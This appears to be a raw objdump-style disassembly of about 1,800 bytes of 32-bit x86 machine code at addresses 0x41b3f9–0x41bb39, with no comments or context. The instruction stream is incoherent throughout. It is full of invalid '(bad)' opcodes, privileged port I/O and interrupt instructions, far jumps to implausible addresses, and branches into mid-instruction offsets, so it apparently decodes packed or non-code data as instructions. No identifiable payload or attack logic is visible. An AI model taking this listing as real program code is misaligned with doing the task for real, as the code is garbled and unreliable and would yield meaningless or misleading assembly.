  41b3f9:	lods   eax,DWORD PTR ds:[esi]
  41b3fa:	mov    ecx,0x5727b53c
  41b3ff:	sbb    bh,bl
  41b401:	jg     0x41b3c7
  41b403:	cmp    al,0x36
  41b405:	mov    edx,0x8d7fb47a
  41b40a:	jnp    0x773864bb
  41b410:	fucomi st,st(6)
  41b412:	cmp    al,0x23
  41b414:	xor    DWORD PTR [ecx+0x58cd8ff2],esp
  41b41a:	sub    al,BYTE PTR [esi+0x31]
  41b41d:	or     BYTE PTR [edi+0x1d1e0d6e],bh
  41b423:	mov    ch,0x21
  41b425:	cmp    ebx,DWORD PTR [ebx+0x25ef462]
  41b42b:	and    BYTE PTR [ebx+0x2faeb9ed],ah
  41b431:	mov    edx,0x3c646ccf
  41b436:	pop    ebp
  41b437:	push   eax
  41b438:	jae    0x41b3fc
  41b43a:	lea    ecx,[eax]
  41b43c:	out    0x46,al
  41b43e:	leave  
  41b43f:	(bad)  
  41b440:	scas   eax,DWORD PTR es:[edi]
  41b441:	jecxz  0x41b416
  41b443:	sti    
  41b444:	fdivr  DWORD PTR [ecx]
  41b446:	daa    
  41b447:	mov    ebp,ss
  41b449:	cmp    eax,0x53fb6efd
  41b44e:	iret   
  41b44f:	fstp   QWORD PTR [eax+0x4a]
  41b452:	addr16 pop es
  41b454:	pop    ebx
  41b455:	xchg   ebx,eax
  41b456:	dec    edx
  41b457:	cmc    
  41b458:	popa   
  41b459:	pop    es
  41b45a:	push   ecx
  41b45b:	xor    BYTE PTR [edi],al
  41b45d:	jnp    0x41b45d
  41b45f:	and    DWORD PTR [esi+0x8784cff],ecx
  41b465:	inc    edi
  41b466:	aas    
  41b467:	pusha  
  41b468:	into   
  41b469:	and    BYTE PTR [edx+eiz*2+0x54fce937],al
  41b470:	or     ch,BYTE PTR [edi+0xf]
  41b473:	adc    al,0x6
  41b475:	inc    esi
  41b476:	inc    esi
  41b477:	mov    BYTE PTR [edx],ah
  41b479:	aad    0x6f
  41b47b:	fnstcw WORD PTR [edi+eax*1-0x2942d123]
  41b482:	push   ebx
  41b483:	dec    eax
  41b484:	fsub   DWORD PTR [ebp+0x76]
  41b487:	add    BYTE PTR [ecx+0xae5150a],0x94
  41b48e:	lds    edx,FWORD PTR [edx]
  41b490:	add    eax,0x2aaebac6
  41b495:	jns    0x41b49d
  41b497:	ret    0x8ea9
  41b49a:	inc    ebp
  41b49b:	sub    ah,BYTE PTR [edi]
  41b49d:	mov    bh,0x72
  41b49f:	and    ecx,DWORD PTR [ecx-0x1f]
  41b4a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4a3:	or     eax,0xcf3cdcd8
  41b4a8:	xor    BYTE PTR [ebx],0x7b
  41b4ab:	fnstcw WORD PTR [ecx-0x7f0ad91d]
  41b4b1:	add    BYTE PTR [edi-0x4b4adcf9],dh
  41b4b7:	mov    eax,ds:0x932104bb
  41b4bc:	jne    0x41b49b
  41b4be:	leave  
  41b4bf:	sub    BYTE PTR [ecx+0x26],al
  41b4c2:	mov    edx,0x7a27498e
  41b4c7:	xor    BYTE PTR [edx+ebp*4],0x0
  41b4cb:	cwde   
  41b4cc:	jmp    0xc26a9f41
  41b4d1:	jno    0x41b4e6
  41b4d3:	jp     0x41b4ac
  41b4d5:	mov    dl,BYTE PTR [ecx+ecx*1+0x5aca5f37]
  41b4dc:	adc    DWORD PTR [ecx-0x5fc2bdc6],ecx
  41b4e2:	mov    dl,BYTE PTR [edi-0x15a35048]
  41b4e8:	aaa    
  41b4e9:	ret    0x329b
  41b4ec:	mov    cl,dl
  41b4ee:	adc    ebx,DWORD PTR [edi-0x18c9c9b8]
  41b4f4:	test   bh,cl
  41b4f6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41b4f8:	data16 mov BYTE PTR [eax+0x17b28669],bh
  41b4ff:	mov    ebx,0x34bb402d
  41b504:	mov    bl,0xe1
  41b506:	xor    DWORD PTR [ecx-0xb3dc577],ecx
  41b50c:	inc    esi
  41b50d:	jg     0x41b4c7
  41b50f:	loop   0x41b4b0
  41b511:	popf   
  41b512:	add    BYTE PTR [edi+0x652dc198],dl
  41b518:	(bad)  
  41b519:	pop    eax
  41b51a:	mov    bh,0x50
  41b51c:	inc    ebx
  41b51d:	mov    ecx,0xc7087e45
  41b522:	(bad)  
  41b523:	mov    ebp,0x12a2039e
  41b528:	sub    bh,bl
  41b52a:	adc    eax,esi
  41b52c:	popa   
  41b52d:	sub    eax,0xcd0d8ce1
  41b532:	pop    edi
  41b533:	mov    ds:0x31702306,eax
  41b538:	xchg   ah,cl
  41b53a:	mov    al,0x2e
  41b53c:	js     0x41b539
  41b53e:	lods   eax,DWORD PTR ds:[esi]
  41b53f:	mov    BYTE PTR [edi-0x70260c52],al
  41b545:	lea    ebx,ds:0xd040118c
  41b54b:	adc    bl,dh
  41b54d:	fild   WORD PTR [ebp-0x150f3460]
  41b553:	mov    bh,0x8c
  41b555:	jae    0x41b50b
  41b557:	mov    al,ds:0x42cc183c
  41b55c:	mov    WORD PTR [ecx-0x34],fs
  41b55f:	mov    ecx,0x3d702f09
  41b564:	popa   
  41b565:	push   cs
  41b566:	xchg   BYTE PTR [eax],dh
  41b568:	jmp    0x650a1a2a
  41b56d:	add    eax,0xf4c87be7
  41b572:	jecxz  0x41b585
  41b574:	repnz mov ecx,0xa0b50f89
  41b57a:	cld    
  41b57b:	fisubr WORD PTR [esi-0x64f76037]
  41b581:	mov    ah,0x9b
  41b583:	cmp    bh,BYTE PTR [ebp-0x4143f9af]
  41b589:	fisttp QWORD PTR [ebx]
  41b58b:	lds    edx,FWORD PTR [esi-0x29a11176]
  41b591:	fcomp  DWORD PTR [esi-0x6e]
  41b594:	dec    ebp
  41b595:	and    DWORD PTR [edi+0x25463414],0xffffffe9
  41b59c:	pop    ecx
  41b59d:	sub    bl,BYTE PTR [edx+0x5cf86eaa]
  41b5a3:	loope  0x41b5ba
  41b5a5:	in     al,dx
  41b5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5a7:	ret    0x42e3
  41b5aa:	int    0x2e
  41b5ac:	pop    esi
  41b5ad:	mov    ds:0x9943e9c4,al
  41b5b2:	mov    ecx,0x5919a061
  41b5b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5b8:	dec    esi
  41b5b9:	pop    edx
  41b5ba:	sub    BYTE PTR [esi-0x32],bl
  41b5bd:	cli    
  41b5be:	clc    
  41b5bf:	inc    eax
  41b5c0:	jmp    0x41b60f
  41b5c2:	in     al,0x68
  41b5c4:	bnd jle 0x41b628
  41b5c7:	pusha  
  41b5c8:	adc    ebx,DWORD PTR [ebp-0x10]
  41b5cb:	cdq    
  41b5cc:	lds    esp,FWORD PTR [esi]
  41b5ce:	std    
  41b5cf:	sub    dl,BYTE PTR [ecx+0x19c2cf0a]
  41b5d5:	repz rcr DWORD PTR [esi-0x55],1
  41b5d9:	repz fucomi st,st(3)
  41b5dc:	aad    0x28
  41b5de:	out    dx,eax
  41b5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e0:	push   eax
  41b5e1:	imul   esp,DWORD PTR ds:0x88ec8e9f,0xd984749a
  41b5eb:	jle    0x41b66c
  41b5ed:	lods   al,BYTE PTR ds:[esi]
  41b5ee:	call   0x37c5:0x25a0e221
  41b5f5:	pop    edx
  41b5f6:	mov    cl,0xe5
  41b5f8:	mov    ch,0xa8
  41b5fa:	out    dx,eax
  41b5fb:	inc    dl
  41b5fd:	aas    
  41b5fe:	rol    ch,0x92
  41b601:	fsubrp st(3),st
  41b603:	in     eax,0xe3
  41b605:	push   esp
  41b606:	jl     0x41b5ed
  41b608:	pop    ecx
  41b609:	jmp    0xe759:0xdfab89df
  41b610:	xchg   BYTE PTR [edx-0x323a90a5],dl
  41b616:	dec    eax
  41b617:	add    esp,DWORD PTR [edi-0x6951e4b2]
  41b61d:	cli    
  41b61e:	out    0x79,al
  41b620:	jp     0x41b63b
  41b622:	mov    ah,0x96
  41b624:	adc    al,0x43
  41b626:	outs   dx,BYTE PTR ds:[esi]
  41b627:	dec    esi
  41b628:	pusha  
  41b629:	mov    ah,BYTE PTR [eax+0x4c]
  41b62c:	inc    edx
  41b62d:	icebp  
  41b62e:	inc    edx
  41b62f:	es pop edx
  41b631:	pushf  
  41b632:	mov    eax,0x30625cde
  41b637:	daa    
  41b638:	test   eax,0xf5c99db3
  41b63d:	sbb    edx,ebx
  41b63f:	cmp    BYTE PTR [edi],dl
  41b641:	push   esi
  41b642:	mov    ebp,0x7ab8c4ae
  41b647:	mov    bl,0xff
  41b649:	mov    bh,0x8a
  41b64b:	fcom   DWORD PTR [ecx-0x49a8921f]
  41b651:	mov    DWORD PTR [ebx+ecx*4],edi
  41b654:	mov    dh,0x72
  41b656:	ret    0x9696
  41b659:	or     bl,cl
  41b65b:	cdq    
  41b65c:	mov    esp,gs
  41b65e:	ror    DWORD PTR [ebx],1
  41b660:	add    al,0xa2
  41b662:	fiadd  WORD PTR [esi+eax*8+0x13]
  41b666:	cmp    dl,BYTE PTR [esi]
  41b668:	sub    ch,BYTE PTR [ebp-0x1c]
  41b66b:	xchg   ebp,eax
  41b66c:	mov    ah,0xab
  41b66e:	clc    
  41b66f:	xchg   esp,eax
  41b670:	les    esp,FWORD PTR [edi]
  41b672:	or     al,0x71
  41b674:	fild   QWORD PTR [ebx-0x79bf1715]
  41b67a:	sub    BYTE PTR [esi],cl
  41b67c:	mov    ds:0xeeb2911e,eax
  41b681:	xchg   ebp,eax
  41b682:	lock div BYTE PTR [edi-0x7]
  41b686:	out    dx,eax
  41b687:	jg     0x41b626
  41b689:	mov    ebx,0x64db1d7d
  41b68e:	das    
  41b68f:	jge    0x41b63b
  41b691:	das    
  41b692:	jmp    0xa5b9e757
  41b697:	pop    ecx
  41b698:	xchg   esi,eax
  41b699:	ret    0xb21d
  41b69c:	sbb    eax,0x12891eb1
  41b6a1:	jmp    0x41b660
  41b6a3:	mov    edi,DWORD PTR [edx]
  41b6a5:	xchg   bl,cl
  41b6a7:	mov    BYTE PTR [ecx],bh
  41b6a9:	jb     0x41b71f
  41b6ab:	fmulp  st(6),st
  41b6ad:	sbb    eax,DWORD PTR cs:[esi+eax*8-0x426474a7]
  41b6b5:	pop    ds
  41b6b6:	mov    al,0xaa
  41b6b8:	inc    ecx
  41b6b9:	popf   
  41b6ba:	mov    bh,0xbb
  41b6bc:	sub    dh,BYTE PTR [ebx]
  41b6be:	stc    
  41b6bf:	xchg   DWORD PTR [esi+0x3d],ebx
  41b6c2:	push   ebp
  41b6c3:	leave  
  41b6c4:	xor    cl,bl
  41b6c6:	stos   BYTE PTR es:[edi],al
  41b6c7:	pop    edi
  41b6c8:	inc    esi
  41b6c9:	fs inc esp
  41b6cb:	sbb    BYTE PTR ds:0x99a9bc7c,0x75
  41b6d2:	loope  0x41b66d
  41b6d4:	mov    dh,0xee
  41b6d6:	cmc    
  41b6d7:	xor    BYTE PTR [eax+0x5f5ced67],bl
  41b6dd:	fsubr  QWORD PTR [esi-0x4b]
  41b6e0:	aam    0x38
  41b6e2:	or     dh,BYTE PTR [esp+eiz*8]
  41b6e5:	jno    0x41b715
  41b6e7:	bound  ebx,QWORD PTR [ebx+ebx*2]
  41b6ea:	mov    edi,0x3440f277
  41b6ef:	pop    ebp
  41b6f0:	xchg   edi,eax
  41b6f1:	dec    ebx
  41b6f2:	pop    esp
  41b6f3:	sahf   
  41b6f4:	mov    eax,ds:0xf8eeefd5
  41b6f9:	sbb    DWORD PTR [esi+eax*8+0x75],esi
  41b6fd:	dec    ebp
  41b6fe:	cwde   
  41b6ff:	mov    DWORD PTR ds:0x8178,eax
  41b704:	xchg   edi,eax
  41b705:	sbb    BYTE PTR [edx-0xd60dd9b],0xa1
  41b70c:	xchg   esi,eax
  41b70d:	cli    
  41b70e:	cwde   
  41b70f:	ds cs jmp 0x41b711
  41b713:	call   0xf35b8d54
  41b718:	or     dh,ah
  41b71a:	sbb    bh,BYTE PTR [ebp-0x80]
  41b71d:	inc    eax
  41b71e:	out    dx,eax
  41b71f:	or     bh,bl
  41b721:	inc    edx
  41b722:	stos   DWORD PTR es:[edi],eax
  41b723:	fistp  QWORD PTR [ecx+0x1daefbd4]
  41b729:	xchg   ebp,eax
  41b72a:	sub    cl,BYTE PTR [eax+0x3f23419e]
  41b730:	enter  0x5abd,0x86
  41b734:	in     eax,dx
  41b735:	mov    bl,0x45
  41b737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b738:	repz (bad) 
  41b73b:	pop    ds
  41b73c:	in     eax,dx
  41b73d:	rcr    DWORD PTR [ebp-0x20ada181],0xae
  41b744:	and    eax,0xf543cab7
  41b749:	test   eax,0x26dc764b
  41b74e:	mov    esp,DWORD PTR [ecx-0x2df4c465]
  41b754:	mov    ecx,0xf756b003
  41b759:	push   0x8e114b3
  41b75e:	std    
  41b75f:	rcpps  xmm6,xmm1
  41b762:	mov    BYTE PTR [edx-0x7a],al
  41b765:	outs   dx,BYTE PTR ds:[esi]
  41b766:	xchg   edi,eax
  41b767:	(bad)  
  41b768:	jmp    0x30a0aed0
  41b76d:	ja     0x41b778
  41b76f:	fcomp  DWORD PTR [eax-0x13f4697f]
  41b775:	div    BYTE PTR [ebx]
  41b777:	out    0xfb,al
  41b779:	xchg   edx,eax
  41b77a:	pop    edi
  41b77b:	sbb    DWORD PTR es:[ebx],edi
  41b77e:	mov    ecx,DWORD PTR [esi]
  41b780:	inc    edi
  41b781:	popa   
  41b782:	mov    ss,edx
  41b784:	mov    ah,0x8d
  41b786:	imul   ebp,DWORD PTR [ecx],0xffffffb8
  41b789:	ins    DWORD PTR es:[edi],dx
  41b78a:	push   edi
  41b78b:	je     0x41b784
  41b78d:	lock mov al,ds:0x9bc7e593
  41b793:	xlat   BYTE PTR ds:[ebx]
  41b794:	jo     0x41b73f
  41b796:	cdq    
  41b797:	(bad)  
  41b798:	int    0xe1
  41b79a:	pop    ds
  41b79b:	mov    al,0x72
  41b79d:	jnp    0x41b791
  41b79f:	aaa    
  41b7a0:	test   al,0xae
  41b7a2:	sbb    BYTE PTR [esi+0x73],bl
  41b7a5:	push   es
  41b7a6:	inc    eax
  41b7a7:	cmp    eax,0x358884a7
  41b7ac:	sub    DWORD PTR [esi+eax*1-0x37],edi
  41b7b0:	sub    cl,dl
  41b7b2:	call   FWORD PTR [edi]
  41b7b4:	push   0x33
  41b7b6:	xchg   DWORD PTR [ebx-0x58],esp
  41b7b9:	aas    
  41b7ba:	jne    0x41b7a5
  41b7bc:	adc    BYTE PTR [ebx+0xc],ch
  41b7bf:	push   edi
  41b7c0:	jne    0x41b794
  41b7c2:	pop    edx
  41b7c3:	adc    al,0x8
  41b7c5:	bound  esp,QWORD PTR [edi+0x2ef8f85c]
  41b7cb:	sti    
  41b7cc:	cmp    edx,DWORD PTR [eax+0x20]
  41b7cf:	ins    BYTE PTR es:[edi],dx
  41b7d0:	cmp    al,ah
  41b7d2:	push   esi
  41b7d3:	cs push esp
  41b7d5:	test   al,0x82
  41b7d7:	mov    cl,0xaf
  41b7d9:	mov    cl,0x5c
  41b7db:	mov    esi,DWORD PTR [eax+0x4457e752]
  41b7e1:	leave  
  41b7e2:	test   al,0x6b
  41b7e4:	jmp    0x41b80e
  41b7e6:	fst    QWORD PTR [eax]
  41b7e8:	test   al,0x64
  41b7ea:	popa   
  41b7eb:	mov    dh,0x11
  41b7ed:	and    BYTE PTR [esi+0x5825f670],cl
  41b7f3:	xlat   BYTE PTR ds:[ebx]
  41b7f4:	iret   
  41b7f5:	inc    ebx
  41b7f6:	gs jl  0x41b80d
  41b7f9:	arpl   WORD PTR [edi+eax*1],sp
  41b7fc:	out    0x35,eax
  41b7fe:	mov    BYTE PTR [eax+0x3],bl
  41b801:	push   DWORD PTR ss:[edx]
  41b804:	cs push 0x12
  41b807:	sub    edi,DWORD PTR [ecx+ebp*4]
  41b80a:	out    dx,al
  41b80b:	xor    ch,BYTE PTR [edx-0x80]
  41b80e:	jp     0x41b830
  41b810:	adc    al,0xe0
  41b812:	rol    ebp,0x39
  41b815:	pop    esp
  41b816:	aas    
  41b817:	mov    ds:0x36c352d5,eax
  41b81c:	popa   
  41b81d:	enter  0x6e7c,0x33
  41b821:	mov    ebx,0x5ea1136c
  41b826:	cli    
  41b827:	jno    0x41b896
  41b829:	repz cwde 
  41b82b:	cmp    esi,edi
  41b82d:	push   edi
  41b82e:	dec    ebx
  41b82f:	ret    0x4c08
  41b832:	jge    0x41b7f2
  41b834:	jecxz  0x41b83e
  41b836:	mov    edi,0x8944095f
  41b83b:	mov    esp,eax
  41b83d:	loopne 0x41b818
  41b83f:	addr16 inc edi
  41b841:	add    DWORD PTR [esi],eax
  41b843:	out    dx,al
  41b844:	std    
  41b845:	dec    eax
  41b846:	mov    fs,WORD PTR [edi]
  41b848:	repz dec ebx
  41b84a:	inc    ebp
  41b84b:	dec    ecx
  41b84c:	clc    
  41b84d:	daa    
  41b84e:	adc    eax,0x2d147541
  41b853:	cmp    al,0xa
  41b855:	inc    edi
  41b856:	mov    ecx,0x8d41f9ce
  41b85b:	(bad)  
  41b85c:	adc    BYTE PTR [ebp+0x3a],al
  41b85f:	xchg   ecx,eax
  41b860:	sti    
  41b861:	push   ebx
  41b862:	jg     0x41b889
  41b864:	xor    ecx,DWORD PTR [esi]
  41b866:	les    esp,FWORD PTR [edx-0xd]
  41b869:	xor    al,0xaa
  41b86b:	and    ebx,DWORD PTR [ebp-0x6]
  41b86e:	xchg   edx,eax
  41b86f:	push   ss
  41b870:	jg     0x41b821
  41b872:	lds    esi,FWORD PTR [ebx+0xe13b755]
  41b878:	mov    al,0x4c
  41b87a:	scas   eax,DWORD PTR es:[edi]
  41b87b:	loope  0x41b843
  41b87d:	cwde   
  41b87e:	loop   0x41b8a5
  41b880:	inc    ecx
  41b881:	pop    ebx
  41b882:	fmul   st,st(7)
  41b884:	test   BYTE PTR [edi+0x5c20f4c9],al
  41b88a:	(bad)  
  41b88b:	mov    ah,0x97
  41b88d:	jbe    0x41b870
  41b88f:	sti    
  41b890:	lahf   
  41b891:	js     0x41b813
  41b893:	sub    al,0xfe
  41b895:	mov    esp,0x96e7a643
  41b89a:	in     eax,0x49
  41b89c:	or     dh,cl
  41b89e:	cdq    
  41b89f:	xchg   BYTE PTR [edx],ah
  41b8a1:	fnstenv [ecx-0x725803fe]
  41b8a7:	jbe    0x41b905
  41b8a9:	in     eax,dx
  41b8aa:	test   eax,0x446e05f8
  41b8af:	(bad)
  41b8b3:	xlat   BYTE PTR ds:[ebx]
  41b8b4:	dec    esi
  41b8b5:	xchg   edx,eax
  41b8b6:	jp     0x41b871
  41b8b8:	imul   ebx
  41b8ba:	call   0x679333df
  41b8bf:	and    DWORD PTR [ebp-0x23b06291],ecx
  41b8c5:	repz xchg edx,eax
  41b8c7:	sub    BYTE PTR [eax+edx*8-0x33],dl
  41b8cb:	icebp  
  41b8cc:	jp     0x41b8fc
  41b8ce:	sbb    ch,BYTE PTR [edx]
  41b8d0:	inc    esp
  41b8d1:	sub    ah,bh
  41b8d3:	icebp  
  41b8d4:	cwde   
  41b8d5:	push   edx
  41b8d6:	add    dl,BYTE PTR [edx]
  41b8d8:	mov    BYTE PTR ds:0xb782bc1b,bl
  41b8de:	or     DWORD PTR [esi+0x78],edx
  41b8e1:	cwde   
  41b8e2:	aad    0xba
  41b8e4:	dec    ecx
  41b8e5:	adc    DWORD PTR [eax],edx
  41b8e7:	pop    esp
  41b8e8:	fwait
  41b8e9:	mov    BYTE PTR [edi],dh
  41b8eb:	leave  
  41b8ec:	xor    bl,BYTE PTR [edi-0x70]
  41b8ef:	shr    BYTE PTR [ecx-0x31f62ad9],cl
  41b8f5:	stc    
  41b8f6:	out    dx,al
  41b8f7:	cmp    ebx,DWORD PTR ds:0xdf467b14
  41b8fd:	loope  0x41b943
  41b8ff:	aam    0x4a
  41b901:	dec    eax
  41b902:	adc    DWORD PTR [edx],ebp
  41b904:	cmp    al,0xa0
  41b906:	pop    eax
  41b907:	mov    edi,0xb417023a
  41b90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b90d:	outs   dx,DWORD PTR ds:[esi]
  41b90e:	xor    ebp,DWORD PTR [eax]
  41b910:	rcr    DWORD PTR [ebx-0x6e18caa3],0xe9
  41b917:	test   BYTE PTR [esi+0x49f933bc],0xff
  41b91e:	dec    eax
  41b91f:	add    esi,DWORD PTR fs:[eax]
  41b922:	repz sub al,0x35
  41b925:	mov    esp,0xc0bf6a53
  41b92a:	jb     0x41b935
  41b92c:	bound  esp,QWORD PTR [ebx+0x23]
  41b92f:	aaa    
  41b930:	outs   dx,DWORD PTR ds:[esi]
  41b931:	div    BYTE PTR [ebx+0x2b982af3]
  41b937:	les    esp,FWORD PTR [esi]
  41b939:	inc    ecx
  41b93a:	test   eax,0x5bbd53ab
  41b93f:	ins    BYTE PTR es:[edi],dx
  41b940:	push   ds
  41b941:	(bad)  
  41b943:	fiadd  DWORD PTR [eax-0x5e8be2c6]
  41b949:	cs repnz pop edx
  41b94c:	popf   
  41b94d:	scas   eax,DWORD PTR es:[edi]
  41b94e:	sbb    BYTE PTR [edi],dl
  41b950:	pop    ebx
  41b951:	push   eax
  41b952:	stc    
  41b953:	out    0x7c,eax
  41b955:	add    BYTE PTR [esp+ebx*1],ah
  41b958:	dec    edx
  41b959:	xchg   ebp,eax
  41b95a:	out    dx,eax
  41b95b:	inc    eax
  41b95c:	sar    DWORD PTR [edi+esi*2-0x72],1
  41b960:	mov    ecx,0xc81d3696
  41b965:	or     eax,0x813a1875
  41b96a:	pusha  
  41b96b:	(bad)  
  41b96c:	mov    eax,ds:0xd885a7c6
  41b971:	mov    dh,0x9d
  41b973:	mov    esp,0x25b82de8
  41b978:	and    al,0xd3
  41b97a:	or     al,0x36
  41b97c:	call   0xebf23cb7
  41b981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b982:	jae    0x41b989
  41b984:	retf   0x3501
  41b987:	fcomp  QWORD PTR [eax+0x23c2abda]
  41b98d:	pop    esi
  41b98e:	push   ds
  41b98f:	lods   al,BYTE PTR ds:[esi]
  41b990:	nop
  41b991:	sahf   
  41b992:	adc    al,0x2f
  41b994:	fimul  WORD PTR [eax+eax*1]
  41b997:	pop    ds
  41b998:	loope  0x41b973
  41b99a:	mov    ecx,0x5f4437cb
  41b99f:	mov    BYTE PTR ds:0x8c9f3d33,cl
  41b9a5:	imul   BYTE PTR [esi-0xbdb1e9e]
  41b9ab:	push   cs
  41b9ac:	das    
  41b9ad:	mov    esp,0xe5d44745
  41b9b2:	jbe    0x41b94d
  41b9b4:	into   
  41b9b5:	mov    cl,0x1b
  41b9b7:	ret    
  41b9b8:	sub    DWORD PTR [esi-0x6cfc9110],ebx
  41b9be:	push   0x72
  41b9c0:	pop    edx
  41b9c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9c2:	cld    
  41b9c3:	dec    ecx
  41b9c4:	push   ebx
  41b9c5:	adc    DWORD PTR [edi],esi
  41b9c7:	sahf   
  41b9c8:	jne    0x41b953
  41b9ca:	(bad)  
  41b9cb:	fmul   QWORD PTR ds:0x8288e964
  41b9d1:	(bad)  
  41b9d2:	mov    edx,0xa1b68c10
  41b9d7:	inc    esi
  41b9d8:	adc    BYTE PTR [edx],bl
  41b9da:	fcomp  QWORD PTR [ebp+edx*1-0x46]
  41b9de:	or     DWORD PTR [esi+0x376005e0],edx
  41b9e4:	adc    al,0x3e
  41b9e6:	mov    BYTE PTR [eax*4-0x1f1e568e],0x11
  41b9ee:	(bad)  
  41b9ef:	jae    0x41b9bd
  41b9f1:	outs   dx,DWORD PTR ds:[esi]
  41b9f2:	or     BYTE PTR [edx],dl
  41b9f4:	inc    ebx
  41b9f5:	and    edi,esi
  41b9f7:	dec    DWORD PTR [ebp-0x31d0b332]
  41b9fd:	and    ebp,ecx
  41b9ff:	push   esi
  41ba00:	mov    bh,0x3
  41ba02:	out    0xb2,al
  41ba04:	lock out dx,al
  41ba06:	sub    ebp,DWORD PTR [ecx+0x45]
  41ba09:	loop   0x41b9c3
  41ba0b:	sbb    ecx,edx
  41ba0d:	xchg   ah,bl
  41ba0f:	mov    dl,0xd0
  41ba11:	outs   dx,DWORD PTR ds:[esi]
  41ba12:	sti    
  41ba13:	fist   DWORD PTR [edi+0x1]
  41ba16:	add    dl,ah
  41ba18:	mov    eax,0xcf339aee
  41ba1d:	loope  0x41b9d3
  41ba1f:	adc    DWORD PTR [ebx],esp
  41ba21:	adc    al,bh
  41ba23:	jb     0x41b9d1
  41ba25:	cmp    eax,0xb07b4cfd
  41ba2a:	outs   dx,DWORD PTR ds:[esi]
  41ba2b:	jmp    FWORD PTR [edx]
  41ba2d:	push   0xffffffdf
  41ba2f:	popf   
  41ba30:	push   0x288743ee
  41ba35:	loop   0x41b9f6
  41ba37:	fs pop ecx
  41ba39:	retf   0xe62d
  41ba3c:	loop   0x41ba8f
  41ba3e:	sahf   
  41ba3f:	adc    al,0xf5
  41ba41:	(bad)  
  41ba42:	jl     0x41ba61
  41ba44:	xor    esi,eax
  41ba46:	enter  0x8e76,0xe5
  41ba4a:	pop    es
  41ba4b:	dec    esp
  41ba4c:	inc    ecx
  41ba4d:	mov    ds:0x458d465f,eax
  41ba52:	jno    0x41ba17
  41ba54:	jge    0x41ba0e
  41ba56:	cmp    ebp,esp
  41ba58:	pop    esp
  41ba59:	fwait
  41ba5a:	jno    0x41ba1d
  41ba5c:	addr16 inc esp
  41ba5e:	call   0xb2e23a1d
  41ba63:	arpl   WORD PTR [ebx],cx
  41ba65:	sub    al,BYTE PTR [eax]
  41ba67:	and    edi,eax
  41ba69:	aaa    
  41ba6a:	cwde   
  41ba6b:	mov    dl,0x1f
  41ba6d:	xchg   ebx,eax
  41ba6e:	ins    DWORD PTR es:[edi],dx
  41ba6f:	sbb    edi,eax
  41ba71:	pop    ds
  41ba72:	or     eax,0xebbad2e1
  41ba77:	xor    BYTE PTR [edx-0x80],bl
  41ba7a:	clc    
  41ba7b:	push   ecx
  41ba7c:	mov    edi,0xefd9d749
  41ba81:	leave  
  41ba82:	or     cl,BYTE PTR [ebx-0x5]
  41ba85:	mov    bh,BYTE PTR [eax-0x34]
  41ba88:	int3   
  41ba89:	js     0x41bae8
  41ba8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba8c:	rcl    BYTE PTR [ebx-0x591d87eb],cl
  41ba92:	mov    ecx,0x8547fde5
  41ba97:	xor    BYTE PTR [ebp-0x78],ah
  41ba9a:	in     al,0x88
  41ba9c:	data16 lods al,BYTE PTR gs:[esi]
  41ba9f:	jmp    0x974a:0xa4aa03c1
  41baa6:	cli    
  41baa7:	scas   al,BYTE PTR es:[di]
  41baa9:	popf   
  41baaa:	fidiv  WORD PTR [edi+0x5e]
  41baad:	jno    0x41bb26
  41baaf:	test   eax,0x390dbe35
  41bab4:	adc    BYTE PTR [ecx+0x3cf28cf3],0x1b
  41babb:	aas    
  41babc:	arpl   bx,sp
  41babe:	sbb    DWORD PTR [edx],ebp
  41bac0:	loope  0x41bb0b
  41bac2:	dec    edx
  41bac3:	cmp    al,0xb0
  41bac5:	jg     0x41ba7a
  41bac7:	aad    0x86
  41bac9:	out    dx,eax
  41baca:	mul    DWORD PTR [esp+ebx*4+0x5c]
  41bace:	ins    DWORD PTR es:[edi],dx
  41bacf:	sub    al,0x8f
  41bad1:	out    dx,eax
  41bad2:	cld    
  41bad3:	pop    ds
  41bad4:	in     eax,0x3b
  41bad6:	or     BYTE PTR [ebx],al
  41bad8:	pop    ds
  41bad9:	fwait
  41bada:	xchg   esi,eax
  41badb:	fnstenv [ecx]
  41badd:	mov    esi,0xff6e795d
  41bae2:	pop    ecx
  41bae3:	dec    esi
  41bae4:	retf   
  41bae5:	push   ds
  41bae6:	pop    esp
  41bae7:	sub    al,0xb8
  41bae9:	hlt    
  41baea:	cdq    
  41baeb:	shl    edi,0xac
  41baee:	push   0xffffffd3
  41baf0:	cmp    esi,edi
  41baf2:	push   ebx
  41baf3:	jo     0x41bb72
  41baf5:	lahf   
  41baf6:	xchg   DWORD PTR [ecx-0x2c],edx
  41baf9:	out    dx,al
  41bafa:	aad    0x20
  41bafc:	sahf   
  41bafd:	sub    bh,ah
  41baff:	ins    BYTE PTR es:[edi],dx
  41bb00:	pop    eax
  41bb01:	repnz aam 0xd5
  41bb04:	push   eax
  41bb05:	(bad)  
  41bb06:	cmc    
  41bb07:	in     al,0x31
  41bb09:	lds    ebx,FWORD PTR [edi]
  41bb0b:	pop    ecx
  41bb0c:	pop    ss
  41bb0d:	je     0x41baaa
  41bb0f:	in     eax,0x81
  41bb11:	lds    esp,FWORD PTR [edx]
  41bb13:	test   al,0x8d
  41bb15:	outs   dx,DWORD PTR ds:[esi]
  41bb16:	inc    esp
  41bb17:	push   ds
  41bb18:	and    eax,0x6beb6280
  41bb1d:	dec    edx
  41bb1e:	dec    ecx
  41bb1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb20:	cmp    esi,DWORD PTR fs:[esi]
  41bb23:	push   ecx
  41bb24:	pop    edx
  41bb25:	add    eax,0x6736fdda
  41bb2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb2b:	mov    dl,0x5c
  41bb2d:	and    al,0x87
  41bb2f:	inc    BYTE PTR [ebx]
  41bb31:	mov    al,0xf3
  41bb33:	sbb    cl,dh
  41bb35:	neg    DWORD PTR [ecx]
  41bb37:	pop    ds
  41bb38:	push   edx
  41bb39:	and    edx,DWORD PTR [ebx-0x293b54ee]
